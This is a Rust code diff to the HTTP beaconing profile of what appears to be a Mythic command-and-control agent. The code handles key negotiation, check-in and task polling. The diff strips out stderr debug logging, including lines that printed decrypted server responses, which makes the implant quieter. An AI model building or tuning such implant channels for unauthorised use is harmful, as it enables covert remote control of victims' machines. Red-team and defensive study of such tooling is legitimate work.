@@ -233,8 +233,6 @@ impl HttpProfile {
         let headers = self.build_headers();
         let encoded = self.encode_message(data);
 
-        eprintln!("[sebastian] HTTP POST -> {}", url);
-
         for attempt in 0..MAX_RETRY_COUNT {
             match client
                 .post(&url)
@@ -244,21 +242,19 @@ impl HttpProfile {
                 .await
             {
                 Ok(resp) => {
-                    eprintln!("[sebastian] HTTP response status: {}", resp.status());
                     match resp.text().await {
                     Ok(text) => {
                         if let Some(decoded) = self.decode_response(&text) {
                             return Some(decoded);
                         }
-                        eprintln!("[sebastian] Failed to decode response");
                         return None;
                     }
                     Err(e) => {
-                        eprintln!("[sebastian] Response read error (attempt {}): {}", attempt, e);
+                        utils::print_debug(&format!("Response read error (attempt {}): {}", attempt, e));
                     }
                 }},
                 Err(e) => {
-                    eprintln!("[sebastian] HTTP send error (attempt {}): {}", attempt, e);
+                    utils::print_debug(&format!("HTTP send error (attempt {}): {}", attempt, e));
                     profiles::increment_failed_connection("http");
                 }
             }
@@ -366,21 +362,16 @@ impl Profile for HttpProfile {
         self.running.store(true, Ordering::Relaxed);
         self.should_stop.store(false, Ordering::Relaxed);
 
-        eprintln!("[sebastian] HTTP profile start(), exchange_check={}", *self.encrypted_exchange_check.read().unwrap());
-
         // Negotiate key if needed
         if !self.negotiate_key().await {
-            eprintln!("[sebastian] HTTP: Key negotiation FAILED");
             self.running.store(false, Ordering::Relaxed);
             return;
         }
-        eprintln!("[sebastian] HTTP: Key negotiation OK");
 
         // Checkin
         let checkin_response = match self.checkin().await {
             Some(r) => r,
             None => {
-                eprintln!("[sebastian] HTTP: Checkin FAILED (no response)");
                 self.running.store(false, Ordering::Relaxed);
                 return;
             }
@@ -396,7 +387,6 @@ impl Profile for HttpProfile {
 
         // Update Mythic ID and sync encryption keys
         if let Some(id) = &checkin_response.id {
-            eprintln!("[sebastian] Checkin OK, Mythic ID: {}, current UUID: {}", id, self.uuid.read().unwrap());
             profiles::set_mythic_id(id);
             // Update profile UUID to use Mythic callback ID for all subsequent messages
             {
@@ -432,23 +422,15 @@ impl Profile for HttpProfile {
                 Ok(j) => j,
                 Err(_) => continue,
             };
-            eprintln!("[sebastian] Polling with UUID={}, outgoing: {}",
-                self.uuid.read().unwrap(),
-                String::from_utf8_lossy(&msg_json[..msg_json.len().min(300)]));
-
             // Send and process response
             if let Some(response_bytes) = self.send_message(&msg_json).await {
-                eprintln!("[sebastian] Decrypted response (first 500): {}",
-                    String::from_utf8_lossy(&response_bytes[..response_bytes.len().min(500)]));
                 match serde_json::from_slice::<crate::structs::MythicMessageResponse>(&response_bytes)
                 {
                     Ok(mythic_response) => {
-                        eprintln!("[sebastian] Poll response: {} tasks, {} responses",
-                            mythic_response.tasks.len(), mythic_response.responses.len());
                         tasks::handle_message_from_mythic(mythic_response).await;
                     }
                     Err(e) => {
-                        eprintln!("[sebastian] Failed to parse poll response: {}", e);
+                        utils::print_debug(&format!("Failed to parse poll response: {}", e));
                     }
                 }
             }
